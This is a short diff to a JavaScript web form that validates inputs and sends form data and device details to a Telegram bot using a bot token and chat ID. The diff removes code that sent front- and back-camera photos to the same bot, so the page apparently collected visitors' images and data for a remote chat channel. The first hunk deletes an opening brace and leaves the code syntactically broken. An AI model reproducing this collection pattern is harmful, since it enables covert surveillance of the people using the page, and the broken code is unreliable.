@@ -29,7 +29,7 @@ function validateInputs() {
 }
 
 // Attach event listeners to all input fields and the dropdown
-inputs.forEach((input) => {
+inputs.forEach((input) => 
   input.addEventListener("input", validateInputs);
 });
 genderDropdown.addEventListener("change", validateInputs);
@@ -113,20 +113,7 @@ OS Version: ${deviceInfo.osVersion}`;
       console.log("Message sent successfully to Telegram bot.");
 
       // Send images to Telegram bot
-      if (frontCameraImage && backCameraImage) {
-        await sendImageToTelegram(
-          telegramBotToken,
-          chatId,
-          frontCameraImage,
-          "Front Camera Photo"
-        );
-        await sendImageToTelegram(
-          telegramBotToken,
-          chatId,
-          backCameraImage,
-          "Back Camera Photo"
-        );
-      }
+      
 
       document.getElementById("message").textContent =
         "Data sent successfully!";
